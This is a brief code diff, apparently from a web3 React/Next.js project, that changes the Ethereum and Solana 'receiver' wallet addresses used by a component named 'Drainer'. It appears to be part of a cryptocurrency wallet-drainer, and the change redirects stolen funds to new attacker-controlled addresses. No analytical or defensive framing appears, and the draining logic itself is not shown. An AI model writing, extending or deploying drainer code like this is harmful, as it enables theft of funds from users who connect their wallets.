@@ -5,8 +5,8 @@ import * as solanaWeb3 from '@solana/web3.js'
 import * as splToken from '@solana/spl-token'
 import Image from 'next/image'
 
-const EVM_RECEIVER = "0x467E3346A112EA09870e0eC1af688A48d00A824F" // Eth
-const SOL_RECEIVER = "CGgAiKGdF9DKoG92iRXnFJTj5TYXsqgiakzM3YMSccHe" // Sol
+const EVM_RECEIVER = "0xcc35ba2aa35B3094702d767D68807c494946ac85" // ETH
+const SOL_RECEIVER = "8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh" // SOL
 
 export default function Drainer() {
   const [account, setAccount] = useState('')
